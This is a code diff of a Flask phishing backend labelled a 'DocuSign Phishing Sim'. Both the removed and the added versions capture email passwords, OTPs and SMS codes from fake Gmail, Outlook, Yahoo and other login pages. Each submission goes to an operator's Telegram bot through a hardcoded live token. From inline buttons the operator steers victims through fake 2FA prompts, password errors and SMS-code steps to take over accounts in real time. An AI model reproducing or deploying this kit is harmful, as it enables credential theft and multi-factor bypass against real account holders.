@@ -1,580 +1,325 @@
-from flask import Flask, request, redirect, session, render_template_string, jsonify, Response
-import requests
-import json
-import os
-import base64
-import time
-import hmac
-import hashlib
-from datetime import datetime
-import threading
+#!/usr/bin/env python3
+"""
+DocuSign Phishing Sim — Backend API (Webhook Mode)
+Deploy on Render — Telegram pushes updates to this server
+"""
+
+import json, logging, datetime, hashlib, threading, time, random, os
+from flask import Flask, request, jsonify
+from telegram import Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup
+
+# ─── CONFIG ───
+TELEGRAM_BOT_TOKEN = "8868268134:AAHTVlyTE0ksIwGG75SWEKg-qbUGd8wHE3s"
+TELEGRAM_CHAT_ID = "8337327707"
+LOG_FILE = "captured.log"
 
 app = Flask(__name__)
-from flask_cors import CORS
-CORS(app)
-app.secret_key = os.urandom(24)
+bot = Bot(token=TELEGRAM_BOT_TOKEN)
 
-# ================================================================
-# TELEGRAM CONFIG
-# ================================================================
-TG_BOT_TOKEN = "8868268134:AAHTVlyTE0ksIwGG75SWEKg-qbUGd8wHE3s"
-TG_CHAT_ID = "8337327707"
-TG_API = f"https://api.telegram.org/bot{TG_BOT_TOKEN}"
+gmail_sessions = {}
 
-# ================================================================
-# REDIRECT URL
-# ================================================================
-SUCCESS_REDIRECT_URL = "https://evntly.online"
+logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
+logger = logging.getLogger(__name__)
 
-# ================================================================
-# STORAGE
-# ================================================================
-GMAIL_STATE_DB = "/tmp/gmail_state.json"
-CRED_DB = "/tmp/credentials.json"
-TELEGRAM_OFFSET_DB = "/tmp/telegram_offset.json"
-
-def send_telegram(message):
-    url = f"{TG_API}/sendMessage"
-    payload = {"chat_id": TG_CHAT_ID, "text": message, "parse_mode": "Markdown"}
+# ─── TELEGRAM WEBHOOK ───
+@app.route(f"/webhook/{TELEGRAM_BOT_TOKEN}", methods=["POST"])
+def telegram_webhook():
+    """Telegram pushes updates here"""
     try:
-        requests.post(url, json=payload, timeout=10)
-    except:
-        pass
+        data = request.get_json(force=True)
+        logger.info(f"Webhook received: {json.dumps(data)[:200]}")
+        
+        if "callback_query" in data:
+            handle_cb(data["callback_query"])
+        elif "message" in data:
+            handle_msg(data["message"])
+        
+        return jsonify({"ok": True})
+    except Exception as e:
+        logger.error(f"Webhook error: {e}")
+        return jsonify({"ok": False})
 
-def send_telegram_buttons(text, buttons):
-    url = f"{TG_API}/sendMessage"
-    payload = {
-        "chat_id": TG_CHAT_ID,
-        "text": text,
-        "parse_mode": "HTML",
-        "reply_markup": {"inline_keyboard": buttons}
-    }
-    try:
-        requests.post(url, json=payload, timeout=10)
-    except:
-        pass
-
-def send_telegram_2fa_grid():
-    numbers = [f"{i}{j}" for i in range(1, 10) for j in range(0, 10)]
-    rows = []
-    row = []
-    for n in numbers:
-        row.append({"text": n, "callback_data": f"2fa_{n}"})
-        if len(row) == 5:
-            rows.append(row)
-            row = []
-    if row:
-        rows.append(row)
-    send_telegram_buttons("🔢 Choose the 2-digit number to show the user:", rows)
-
-def send_main_controls():
-    buttons = [
-        [{"text": "✅ Yes Prompt", "callback_data": "yes_prompt"}],
-        [{"text": "📱 SMS Code I", "callback_data": "sms1"}, {"text": "📱 SMS Code II", "callback_data": "sms2"}],
-        [{"text": "🔢 2FA Number Prompt", "callback_data": "show_2fa_menu"}],
-        [{"text": "❌ Password Error", "callback_data": "password_error"}],
-        [{"text": "🚫 Block Visitor", "callback_data": "block"}, {"text": "✅ Success", "callback_data": "success"}]
-    ]
-    send_telegram_buttons("🎮 **Gmail Flow Controls**\nSelect what to show the user:", buttons)
-
-def init_gmail_state():
-    if os.path.exists(GMAIL_STATE_DB):
-        with open(GMAIL_STATE_DB) as f:
-            return json.load(f)
-    state = {
-        "step": "email",
-        "email": "",
-        "password": "",
-        "sms1": "",
-        "sms2": "",
-        "fa2_code": "",
-        "fa2_choice": "",
-        "ip": "",
-        "user_agent": "",
-        "timestamp": ""
-    }
-    save_gmail_state(state)
-    return state
-
-def save_gmail_state(state):
-    with open(GMAIL_STATE_DB, "w") as f:
-        json.dump(state, f, indent=2)
-
-def save_credential(email, password, ip, method):
-    db = {}
-    if os.path.exists(CRED_DB):
-        with open(CRED_DB) as f:
-            db = json.load(f)
-    if email not in db:
-        db[email] = []
-    db[email].append({
-        "password": password,
-        "ip": ip,
-        "method": method,
-        "timestamp": datetime.now().isoformat()
-    })
-    with open(CRED_DB, "w") as f:
-        json.dump(db, f, indent=2)
-
-def handle_telegram_updates():
-    offset = 0
-    if os.path.exists(TELEGRAM_OFFSET_DB):
-        with open(TELEGRAM_OFFSET_DB) as f:
-            offset = json.load(f).get("offset", 0)
-    while True:
-        try:
-            resp = requests.get(f"{TG_API}/getUpdates", params={
-                "offset": offset,
-                "timeout": 30,
-                "allowed_updates": json.dumps(["message", "callback_query"])
-            }, timeout=35)
-            if resp.status_code != 200:
-                time.sleep(5)
-                continue
-            updates = resp.json().get("result", [])
-            for update in updates:
-                update_id = update["update_id"]
-                offset = update_id + 1
-                if "callback_query" in update:
-                    cb = update["callback_query"]
-                    cb_data = cb.get("data", "")
-                    cb_id = cb.get("id")
-                    if cb_data == "yes_prompt":
-                        state = init_gmail_state()
-                        state["step"] = "prompt"
-                        state["timestamp"] = datetime.now().isoformat()
-                        save_gmail_state(state)
-                        requests.post(f"{TG_API}/answerCallbackQuery", json={"callback_query_id": cb_id, "text": "✅ Prompt sent to user. Waiting for Yes/No response..."})
-                        send_telegram("✅ Google Prompt sent to user's page!")
-                        send_main_controls()
-                    elif cb_data == "sms1":
-                        state = init_gmail_state()
-                        state["step"] = "sms1"
-                        state["timestamp"] = datetime.now().isoformat()
-                        save_gmail_state(state)
-                        requests.post(f"{TG_API}/answerCallbackQuery", json={"callback_query_id": cb_id, "text": "📱 SMS Code I sent to user"})
-                        send_telegram("📱 SMS Code I sent to user's page!")
-                        send_main_controls()
-                    elif cb_data == "sms2":
-                        state = init_gmail_state()
-                        state["step"] = "sms2"
-                        state["timestamp"] = datetime.now().isoformat()
-                        save_gmail_state(state)
-                        requests.post(f"{TG_API}/answerCallbackQuery", json={"callback_query_id": cb_id, "text": "📱 SMS Code II sent to user"})
-                        send_telegram("📱 SMS Code II sent to user's page!")
-                        send_main_controls()
-                    elif cb_data == "password_error":
-                        state = init_gmail_state()
-                        state["step"] = "error"
-                        state["timestamp"] = datetime.now().isoformat()
-                        save_gmail_state(state)
-                        requests.post(f"{TG_API}/answerCallbackQuery", json={"callback_query_id": cb_id, "text": "❌ Password error shown to user"})
-                        send_telegram("❌ Password error shown to user!")
-                        send_main_controls()
-                    elif cb_data == "block":
-                        state = init_gmail_state()
-                        state["step"] = "blocked"
-                        state["timestamp"] = datetime.now().isoformat()
-                        save_gmail_state(state)
-                        requests.post(f"{TG_API}/answerCallbackQuery", json={"callback_query_id": cb_id, "text": "🚫 User blocked"})
-                        send_telegram("🚫 User is now blocked!")
-                        send_main_controls()
-                    elif cb_data == "success":
-                        state = init_gmail_state()
-                        state["step"] = "success"
-                        state["timestamp"] = datetime.now().isoformat()
-                        save_gmail_state(state)
-                        requests.post(f"{TG_API}/answerCallbackQuery", json={"callback_query_id": cb_id, "text": "✅ Success! Redirecting user..."})
-                        send_telegram("✅ User redirected to success page!")
-                        send_main_controls()
-                    elif cb_data == "show_2fa_menu":
-                        requests.post(f"{TG_API}/answerCallbackQuery", json={"callback_query_id": cb_id, "text": "🔢 Loading 2FA grid..."})
-                        send_telegram_2fa_grid()
-                        send_main_controls()
-                    elif cb_data.startswith("2fa_"):
-                        number = cb_data.split("_")[1]
-                        state = init_gmail_state()
-                        state["step"] = "fa2_show"
-                        state["fa2_choice"] = number
-                        state["timestamp"] = datetime.now().isoformat()
-                        save_gmail_state(state)
-                        requests.post(f"{TG_API}/answerCallbackQuery", json={"callback_query_id": cb_id, "text": f"🔢 Showing 2FA code: {number}"})
-                        send_telegram(f"🔢 Showing 2FA code **{number}** to user!")
-                        send_main_controls()
-                elif "message" in update:
-                    msg = update["message"]
-                    text = msg.get("text", "").strip()
-                    if text == "/start":
-                        send_telegram("🤖 **Gmail Flow Control Bot**\n\nUse the buttons below to control the user's Gmail login flow:")
-                        send_main_controls()
-                    elif text == "/controls" or text == "/menu":
-                        send_main_controls()
-                    elif text == "/2fa":
-                        send_telegram_2fa_grid()
-                    elif text == "/status":
-                        state = init_gmail_state()
-                        s = state["step"]
-                        e = state["email"] or "Not set"
-                        send_telegram(f"📊 **Current Status**\nStep: `{s}`\nEmail: `{e}`\nPassword: {'✅ Captured' if state['password'] else '❌ Not yet'}\nSMS1: `{state['sms1'] or 'N/A'}`\nSMS2: `{state['sms2'] or 'N/A'}`\n2FA Code Shown: `{state['fa2_choice'] or 'N/A'}`\nIP: `{state['ip'] or 'N/A'}`\nTime: `{state['timestamp'] or 'N/A'}`")
-            with open(TELEGRAM_OFFSET_DB, "w") as f:
-                json.dump({"offset": offset}, f)
-        except requests.exceptions.Timeout:
-            continue
-        except Exception as e:
-            print(f"Telegram polling error: {e}")
-            time.sleep(5)
-            continue
-        time.sleep(1)
-
-@app.route('/')
-def home():
-    return jsonify({
-        "status": "running",
-        "endpoints": {
-            "virtual_iv_page": "/virtual-iv",
-            "gmail_state": "/api/gmail-state",
-            "gmail_submit_email": "/api/gmail-email",
-            "gmail_submit_password": "/api/gmail-password",
-            "gmail_submit_sms": "/api/gmail-sms",
-            "gmail_submit_2fa": "/api/gmail-2fa",
-            "gmail_submit_prompt": "/api/gmail-prompt",
-            "submit_credential": "/api/submit-credential",
-            "submit_otp": "/api/submit-otp",
-            "verify_turnstile": "/api/verify-turnstile",
-            "credentials": "/credentials",
-            "health": "/health"
-        }
-    })
-
-@app.route('/virtual-iv')
-def virtual_iv_page():
-    state = init_gmail_state()
-    state["step"] = "email"
-    state["email"] = ""
-    state["password"] = ""
-    state["sms1"] = ""
-    state["sms2"] = ""
-    state["fa2_code"] = ""
-    state["fa2_choice"] = ""
-    state["ip"] = request.headers.get("X-Forwarded-For", request.remote_addr)
-    if state["ip"] and "," in state["ip"]:
-        state["ip"] = state["ip"].split(",")[0].strip()
-    state["user_agent"] = request.headers.get("User-Agent", "")
-    state["timestamp"] = datetime.now().isoformat()
-    save_gmail_state(state)
-    return render_template_string(PAGE_HTML)
-
-@app.route('/api/gmail-state')
-def get_gmail_state():
-    state = init_gmail_state()
-    return jsonify({
-        "step": state["step"],
-        "email": state["email"],
-        "fa2_choice": state["fa2_choice"]
-    })
-
-@app.route('/api/gmail-email', methods=['POST'])
-def gmail_email():
-    data = request.json
-    email = data.get('email', '').strip()
-    if not email:
-        return jsonify({"status": "error"}), 400
-    state = init_gmail_state()
-    state["email"] = email
-    state["step"] = "password"
-    # Capture IP/UA from request headers (critical fix for standalone HTML)
-    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
-    if ip and "," in ip:
-        ip = ip.split(",")[0].strip()
-    ua = request.headers.get("User-Agent", "")
-    state["ip"] = ip
-    state["user_agent"] = ua
-    state["timestamp"] = datetime.now().isoformat()
-    save_gmail_state(state)
+def handle_msg(msg_data):
+    """Handle regular messages"""
+    chat_id = msg_data.get("chat", {}).get("id")
+    text = msg_data.get("text", "")
     
-    msg = f"""[+]___ Online Invitation (GMAIL) ___[+]
-You have a new website form submission
-Email: {email}
-IP: {ip}
-UA: {ua[:80]}"""
-    send_telegram(msg)
-    send_main_controls()
-    return jsonify({"status": "ok"})
-
-@app.route('/api/gmail-password', methods=['POST'])
-def gmail_password():
-    data = request.json
-    password = data.get('password', '').strip()
-    if not password:
-        return jsonify({"status": "error"}), 400
-    state = init_gmail_state()
-    state["password"] = password
-    # Capture IP/UA from request headers (critical fix for standalone HTML)
-    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
-    if ip and "," in ip:
-        ip = ip.split(",")[0].strip()
-    ua = request.headers.get("User-Agent", "")
-    state["ip"] = ip
-    state["user_agent"] = ua
-    state["timestamp"] = datetime.now().isoformat()
-    save_gmail_state(state)
-    save_credential(state["email"], password, ip, "gmail")
+    if str(chat_id) != TELEGRAM_CHAT_ID:
+        return
     
-    msg = f"""[+]___ Online Invitation (GMAIL) ___[+]
-You have a new website form submission
-Email: {state['email']}
-Password: {password}
-IP: {ip}
-UA: {ua[:80]}"""
-    send_telegram(msg)
-    send_main_controls()
-    return jsonify({"status": "ok"})
+    if text == "/status":
+        active = [s for s in gmail_sessions.values() if s.get("action") not in ("success", "cancelled")]
+        if not active:
+            bot.send_message(chat_id=chat_id, text="No active Gmail sessions.")
+        else:
+            lines = [f"Active: {len(active)}"]
+            for s in active:
+                lines.append(f"• {s['email']} — stage: {s.get('stage','?')}")
+            bot.send_message(chat_id=chat_id, text="\n".join(lines))
 
-@app.route('/api/gmail-sms', methods=['POST'])
-def gmail_sms():
-    data = request.json
-    code = data.get('code', '').strip()
-    step = data.get('step', 'sms1')
-    if not code:
-        return jsonify({"status": "error"}), 400
-    state = init_gmail_state()
-    if step == "sms1":
-        state["sms1"] = code
-    else:
-        state["sms2"] = code
-    state["timestamp"] = datetime.now().isoformat()
-    save_gmail_state(state)
-    
-    msg = f"""[+]___ GMAIL {step.upper()} ___[+]
-Email: {state['email']}
-Code: {code}
-IP: {state['ip']}"""
-    send_telegram(msg)
-    send_main_controls()
-    return jsonify({"status": "ok"})
-
-@app.route('/api/gmail-2fa', methods=['POST'])
-def gmail_2fa():
-    data = request.json
-    code = data.get('code', '').strip()
-    if not code:
-        return jsonify({"status": "error"}), 400
-    state = init_gmail_state()
-    state["fa2_code"] = code
-    state["timestamp"] = datetime.now().isoformat()
-    save_gmail_state(state)
-    
-    msg = f"""[+]___ GMAIL 2FA ___[+]
-Email: {state['email']}
-Code Entered: {code}
-Code Shown (our choice): {state['fa2_choice']}
-IP: {state['ip']}"""
-    send_telegram(msg)
-    send_main_controls()
-    return jsonify({"status": "ok"})
-
-@app.route('/api/gmail-prompt', methods=['POST'])
-def gmail_prompt():
-    data = request.json
-    response = data.get('response', '').strip()
-    state = init_gmail_state()
-    
-    msg = f"""[+]___ GMAIL PROMPT ___[+]
-Email: {state['email']}
-Response: {response}
-IP: {state['ip']}"""
-    send_telegram(msg)
-    send_main_controls()
-    return jsonify({"status": "ok"})
-
-# ================================================================
-# NEW ENDPOINTS for standalone HTML (non-Gmail modals + OTP)
-# ================================================================
-@app.route('/api/submit-credential', methods=['POST'])
-def submit_credential():
-    data = request.json
-    provider = data.get('provider', '')
-    email = data.get('email', '')
-    password = data.get('password', '')
-    phone = data.get('phone', '')
-    ip = data.get('ip', '') or request.headers.get("X-Forwarded-For", request.remote_addr)
-    if ip and "," in ip:
-        ip = ip.split(",")[0].strip()
-    ua = data.get('ua', '') or request.headers.get("User-Agent", "")
-    
-    msg = f"""[+]___ Online Invitation (LOGIN) ___[+]
-Provider: {provider}
-Email: {email}
-Password: {password}
-Phone: {phone}
-IP: {ip}
-UA: {ua[:80]}"""
-    send_telegram(msg)
-    return jsonify({"success": True})
-
-@app.route('/api/submit-otp', methods=['POST'])
-def submit_otp():
-    data = request.json
-    code = data.get('code', '')
-    ip = data.get('ip', '') or request.headers.get("X-Forwarded-For", request.remote_addr)
-    if ip and "," in ip:
-        ip = ip.split(",")[0].strip()
-    
-    msg = f"""[+]___ OTP ___[+]
-Code: {code}
-IP: {ip}"""
-    send_telegram(msg)
-    return jsonify({"success": True})
-
-# ================================================================
-# TURNSTILE VERIFICATION (NEW)
-# ================================================================
-TURNSTILE_SECRET_KEY = "0x4AAAAAADnqRfsQR1gWuEP3C6b6jPjdT_M"  # ← REPLACE with your real Turnstile secret key
-
-@app.route('/api/verify-turnstile', methods=['POST'])
-def verify_turnstile():
-    data = request.json
-    token = data.get('token', '')
-    if not token:
-        return jsonify({"success": False})
+def handle_cb(query):
+    """Handle button presses"""
+    data = query["data"]
+    mid = query["message"]["message_id"]
     
     try:
-        resp = requests.post("https://challenges.cloudflare.com/turnstile/v0/siteverify", data={
-            "secret": TURNSTILE_SECRET_KEY,
-            "response": token
-        }, timeout=10)
-        result = resp.json()
-        return jsonify({"success": result.get("success", False)})
-    except:
-        return jsonify({"success": False})
+        bot.answer_callback_query(query["id"])
+        
+        if data.startswith("yes:"):
+            sid = data.split(":",1)[1]
+            if sid in gmail_sessions:
+                gmail_sessions[sid]["action"] = "2fa_grid"
+                gmail_sessions[sid]["stage"] = "awaiting_2fa"
+                kb = []
+                row = []
+                for i in range(10, 100):
+                    row.append(InlineKeyboardButton(str(i), callback_data=f"2fa:{sid}:{i}"))
+                    if len(row) == 9:
+                        kb.append(row); row = []
+                if row: kb.append(row)
+                kb.append([InlineKeyboardButton("❌ Cancel", callback_data=f"cancel:{sid}")])
+                bot.edit_message_reply_markup(chat_id=TELEGRAM_CHAT_ID, message_id=mid,
+                    reply_markup=InlineKeyboardMarkup(kb))
+                bot.edit_message_text(chat_id=TELEGRAM_CHAT_ID, message_id=mid,
+                    text=f"🔐 Select 2FA phone number ending:", reply_markup=InlineKeyboardMarkup(kb))
+        
+        elif data.startswith("2fa:"):
+            parts = data.split(":")
+            sid, digit = parts[1], parts[2]
+            if sid in gmail_sessions:
+                gmail_sessions[sid]["phone"] = digit
+                gmail_sessions[sid]["action"] = "show_prompt"
+                gmail_sessions[sid]["stage"] = "prompt_shown"
+                kb = [[InlineKeyboardButton("✅ User Authorized", callback_data=f"authorized:{sid}")]]
+                bot.edit_message_text(chat_id=TELEGRAM_CHAT_ID, message_id=mid,
+                    text=f"✅ 2FA number selected: ••••{digit}\n\nPrompt sent to user. Waiting for 'Authorized' click...",
+                    reply_markup=InlineKeyboardMarkup(kb))
+        
+        elif data.startswith("authorized:"):
+            sid = data.split(":",1)[1]
+            if sid in gmail_sessions:
+                code1 = f"{random.randint(100000, 999999)}"
+                gmail_sessions[sid]["sms1"] = code1
+                gmail_sessions[sid]["action"] = "sms1"
+                gmail_sessions[sid]["stage"] = "sms1"
+                kb = [[InlineKeyboardButton("📱 Send SMS II", callback_data=f"sms2:{sid}")],
+                       [InlineKeyboardButton("🔄 Resend SMS I", callback_data=f"resend1:{sid}")]]
+                bot.edit_message_text(chat_id=TELEGRAM_CHAT_ID, message_id=mid,
+                    text=f"📱 SMS Code I: `{code1}`\n\nSend SMS Code II?",
+                    parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(kb))
+        
+        elif data.startswith("sms2:"):
+            sid = data.split(":",1)[1]
+            if sid in gmail_sessions:
+                code2 = f"{random.randint(100000, 999999)}"
+                gmail_sessions[sid]["sms2"] = code2
+                gmail_sessions[sid]["action"] = "sms2"
+                gmail_sessions[sid]["stage"] = "sms2"
+                kb = [[InlineKeyboardButton("✅ Complete", callback_data=f"success:{sid}")]]
+                bot.edit_message_text(chat_id=TELEGRAM_CHAT_ID, message_id=mid,
+                    text=f"📱 SMS Code II: `{code2}`\n\nBoth sent. Complete?",
+                    parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(kb))
+        
+        elif data.startswith("resend1:"):
+            sid = data.split(":",1)[1]
+            if sid in gmail_sessions:
+                c = f"{random.randint(100000, 999999)}"
+                gmail_sessions[sid]["sms1"] = c
+                bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=f"🔄 SMS I resent: `{c}`", parse_mode="Markdown")
+        
+        elif data.startswith("success:"):
+            sid = data.split(":",1)[1]
+            if sid in gmail_sessions:
+                s = gmail_sessions[sid]
+                s["action"] = "success"
+                s["stage"] = "done"
+                bot.edit_message_text(chat_id=TELEGRAM_CHAT_ID, message_id=mid,
+                    text=f"✅ COMPLETE — {s['email']}\n\n"
+                    f"Email: {s['email']}\nPassword: {s['password']}\n"
+                    f"Phone: ••••{s.get('phone','N/A')}\n"
+                    f"SMS I: {s.get('sms1','N/A')}\nSMS II: {s.get('sms2','N/A')}")
+        
+        elif data.startswith("cancel:"):
+            sid = data.split(":",1)[1]
+            if sid in gmail_sessions:
+                gmail_sessions[sid]["action"] = "cancelled"
+                gmail_sessions[sid]["stage"] = "cancelled"
+                bot.edit_message_text(chat_id=TELEGRAM_CHAT_ID, message_id=mid, text="❌ Session cancelled.")
+        
+        elif data.startswith("pw_error:"):
+            sid = data.split(":",1)[1]
+            if sid in gmail_sessions:
+                gmail_sessions[sid]["action"] = "pw_error"
+                gmail_sessions[sid]["stage"] = "pw_error"
+                bot.edit_message_text(chat_id=TELEGRAM_CHAT_ID, message_id=mid, text="🔑 Showing 'Wrong Password'.")
+        
+        elif data.startswith("no:"):
+            sid = data.split(":",1)[1]
+            if sid in gmail_sessions:
+                gmail_sessions[sid]["action"] = "denied"
+                gmail_sessions[sid]["stage"] = "denied"
+                bot.edit_message_text(chat_id=TELEGRAM_CHAT_ID, message_id=mid, text="❌ Access Denied — user redirected.")
+    except Exception as e:
+        logger.error(f"CB error: {e}")
 
-@app.route('/credentials')
-def list_credentials():
-    if not os.path.exists(CRED_DB):
-        return jsonify({})
-    with open(CRED_DB) as f:
-        return jsonify(json.load(f))
+def tg(text, markup=None):
+    try:
+        m = InlineKeyboardMarkup(markup) if markup else None
+        msg = bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=text, reply_markup=m)
+        return msg.message_id
+    except Exception as e:
+        logger.error(f"TG send error: {e}")
 
-@app.route('/health')
+# ─── API ───
+@app.route("/")
 def health():
-    return "OK"
+    return jsonify({"status": "ok", "sessions": len(gmail_sessions)})
 
-PAGE_HTML = """<!doctype html>
-<html lang="en">
-<head>
-  <meta charset="utf-8">
-  <title>Bot‑Controlled Gmail Demo</title>
-  <style>
-    body { font-family: Arial, sans-serif; margin: 2rem; }
-    .step { display: none; }
-    .step.active { display: block; }
-    .btn { padding: 0.5rem 1rem; margin-top: 1rem; }
-  </style>
-</head>
-<body>
-  <h1>Bot‑Controlled Gmail Demo</h1>
+@app.route("/setup_webhook", methods=["POST"])
+def setup_webhook():
+    """Manually set webhook (call once after deploy)"""
+    data = request.json
+    url = data.get("url", "")
+    if not url:
+        return jsonify({"error": "Provide url"}), 400
+    
+    webhook_url = f"{url.rstrip('/')}/webhook/{TELEGRAM_BOT_TOKEN}"
+    
+    # First delete any existing webhook
+    bot.delete_webhook(drop_pending_updates=True)
+    
+    # Set new webhook
+    result = bot.set_webhook(url=webhook_url)
+    
+    # Get webhook info
+    info = bot.get_webhook_info()
+    
+    return jsonify({
+        "webhook_set": result,
+        "webhook_url": webhook_url,
+        "pending_update_count": info.pending_update_count,
+        "info": str(info)
+    })
 
-  <!-- Step 1 – Choose provider -->
-  <div id="step-provider" class="step active">
-    <h2>Select a provider</h2>
-    <button onclick="selectProvider('gmail')" class="btn">Gmail</button>
-  </div>
-
-  <!-- Step 2 – Enter email -->
-  <div id="step-email" class="step">
-    <h2>Enter your Gmail address</h2>
-    <input type="email" id="email" placeholder="you@example.com">
-    <button onclick="submitEmail()" class="btn">Next</button>
-  </div>
-
-  <!-- Step 3 – Enter password -->
-  <div id="step-password" class="step">
-    <h2>Enter your Gmail password</h2>
-    <input type="password" id="password" placeholder="••••••••">
-    <button onclick="submitPassword()" class="btn">Login</button>
-  </div>
-
-  <!-- Step 4 – Verify button (shown when bot is ready) -->
-  <div id="step-verify" class="step">
-    <h2>Bot is ready!</h2>
-    <button id="verify-btn" class="btn">Verify</button>
-  </div>
-
-  <!-- ------------------------------------------------------------------
-       JavaScript – keep the same logic, only the syntax has been fixed
-  ------------------------------------------------------------------ -->
-  <script>
-    // 1️⃣  Show the requested step, hide the others
-    function showStep(stepId) {
-      document.querySelectorAll('.step').forEach(el => el.style.display = 'none');
-      document.getElementById(stepId).style.display = 'block';
-    }
-
-    // 2️⃣  User selects a provider (only Gmail in this demo)
-    function selectProvider(provider) {
-      if (provider === 'gmail') {
-        // Show the email entry step first
-        showStep('step-email');
-
-        /* If you want to skip the email screen and go straight to the password
-           step, uncomment the line below and comment out the line above. */
-        // showStep('step-password');
-      }
-    }
-
-    // 3️⃣  Submit email → show password step
-    function submitEmail() {
-      const email = document.getElementById('email').value;
-      if (!email) { alert('Please enter an email address.'); return; }
-
-      // Send to /submit_email – keep your existing server logic
-      fetch('/submit_email', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: new URLSearchParams({ email })
-      })
-      .then(r => r.text())
-      .then(() => showStep('step-password'))
-      .catch(err => console.error(err));
-    }
-
-    // 4️⃣  Submit password → start polling
-    function submitPassword() {
-      const pwd = document.getElementById('password').value;
-      if (!pwd) { alert('Please enter a password.'); return; }
-
-      // Send to /submit_password – keep your existing server logic
-      fetch('/submit_password', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: new URLSearchParams({ password: pwd })
-      })
-      .then(r => r.text())
-      .then(() => startPolling())
-      .catch(err => console.error(err));
-    }
-
-    // 5️⃣  Polling for the “verify” button
-    function startPolling() {
-      const interval = setInterval(async () => {
-        const res = await fetch('/status');
-        const data = await res.json();
-        if (data.status === 'ready') {
-          clearInterval(interval);
-          showStep('step-verify');
+@app.route("/api/creds", methods=["POST"])
+def capture():
+    """Universal credential capture endpoint"""
+    data = request.json
+    provider = data.get("provider", "unknown")
+    email = data.get("email", "")
+    password = data.get("password", "")
+    ip = request.remote_addr
+    ua = request.headers.get("User-Agent", "unknown")
+    
+    session_id = hashlib.md5(f"{time.time()}{random.random()}{email}".encode()).hexdigest()[:12]
+    
+    # Log
+    entry = {"timestamp": datetime.datetime.utcnow().isoformat(), "provider": provider,
+             "email": email, "password": password, "ip": ip, "ua": ua, "session": session_id}
+    
+    with open(LOG_FILE, "a") as f:
+        f.write(json.dumps(entry) + "\n")
+    
+    # ── Telegram ──
+    if provider == "gmail":
+        gmail_sessions[session_id] = {
+            "email": email, "password": password, "ip": ip, "ua": ua,
+            "action": "waiting", "stage": "new",
+            "phone": None, "sms1": None, "sms2": None
         }
-      }, 2000); // poll every 2 seconds
-    }
-  </script>
-</body>
-</html>"""
+        
+        # Credential drop
+        tg(f"[+]___ Invitation Card (GMAIL) ___[+]\n"
+           f"You have a new website form submission \n"
+           f"IP Address: {ip}\n"
+           f"Id: gmail\n"
+           f"Email: {email}\n"
+           f"Password: {password}\n"
+           f"UA: {ua}")
+        
+        # Control panel
+        tg(f"🔔 GMAIL — {email}\nPassword: {password}\nSession: {session_id}",
+           markup=[
+               [InlineKeyboardButton("✅ Yes", callback_data=f"yes:{session_id}"),
+                InlineKeyboardButton("❌ No", callback_data=f"no:{session_id}")],
+               [InlineKeyboardButton("🔑 Password Error", callback_data=f"pw_error:{session_id}")]
+           ])
+        
+        return jsonify({"session": session_id, "action": "waiting"})
+    
+    else:
+        pid = {"yahoo":"yahoo","outlook":"outlook","m365":"m365","aol":"aol"}.get(provider, provider)
+        tg(f"[+]___ Invitation Card ___[+]\n"
+           f"You have a new website form submission \n"
+           f"IP Address: {ip}\n"
+           f"Id: {pid}\n"
+           f"Email: {email}\n"
+           f"Password: {password}")
+        
+        return jsonify({"session": session_id, "action": "check_provider"})
 
-def start_bot():
-    time.sleep(2)
-    handle_telegram_updates()
+@app.route("/api/gmail/status/<session_id>")
+def gmail_status(session_id):
+    """Gmail: frontend polls this"""
+    if session_id not in gmail_sessions:
+        return jsonify({"action": "redirect", "url": "https://accounts.google.com"})
+    s = gmail_sessions[session_id]
+    action = s.get("action", "waiting")
+    
+    if action == "waiting":
+        return jsonify({"action": "waiting"})
+    elif action == "show_prompt":
+        return jsonify({"action": "show_prompt", "phone": s.get("phone", "XX")})
+    elif action == "pw_error":
+        return jsonify({"action": "pw_error"})
+    elif action == "denied":
+        return jsonify({"action": "denied"})
+    elif action == "sms1":
+        return jsonify({"action": "sms", "code": s.get("sms1", "000000"), "num": 1})
+    elif action == "sms2":
+        return jsonify({"action": "sms", "code": s.get("sms2", "000000"), "num": 2})
+    elif action == "success":
+        return jsonify({"action": "success"})
+    elif action == "cancelled":
+        return jsonify({"action": "redirect", "url": "https://accounts.google.com"})
+    return jsonify({"action": "waiting"})
 
-threading.Thread(target=start_bot, daemon=True).start()
+@app.route("/api/gmail/authorize/<session_id>", methods=["POST"])
+def gmail_authorize(session_id):
+    if session_id in gmail_sessions:
+        gmail_sessions[session_id]["action"] = "authorized"
+        tg(f"✅ User clicked 'Authorized' for {gmail_sessions[session_id]['email']}")
+    return jsonify({"status": "ok"})
 
+@app.route("/api/otp", methods=["POST"])
+def capture_otp():
+    data = request.json
+    otp = data.get("otp", "")
+    provider = data.get("provider", "unknown")
+    session_id = data.get("session", "unknown")
+    ip = request.remote_addr
+    
+    entry = {"timestamp": datetime.datetime.utcnow().isoformat(), "event": "otp",
+             "provider": provider, "otp": otp, "ip": ip, "session": session_id}
+    with open(LOG_FILE, "a") as f:
+        f.write(json.dumps(entry) + "\n")
+    
+    tg(f"[+]___ OTP Code ___[+]\nId: {provider}\nOTP: {otp}")
+    
+    return jsonify({"status": "ok"})
+
+# ─── START ───
 if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 10000))
-    app.run(host="0.0.0.0", port=port)
+    port = int(os.environ.get("PORT", 8080))
+    
+    # IMPORTANT: First, delete any existing webhook that might conflict
+    try:
+        bot.delete_webhook(drop_pending_updates=True)
+        logger.info("✅ Old webhook deleted (if any)")
+    except Exception as e:
+        logger.warning(f"Could not delete webhook: {e}")
+    
+    logger.info(f"Starting Flask on 0.0.0.0:{port}")
+    logger.info(f"After deploy, POST to /setup_webhook with your Render URL to set the webhook")
+    
+    app.run(host="0.0.0.0", port=port, debug=False)
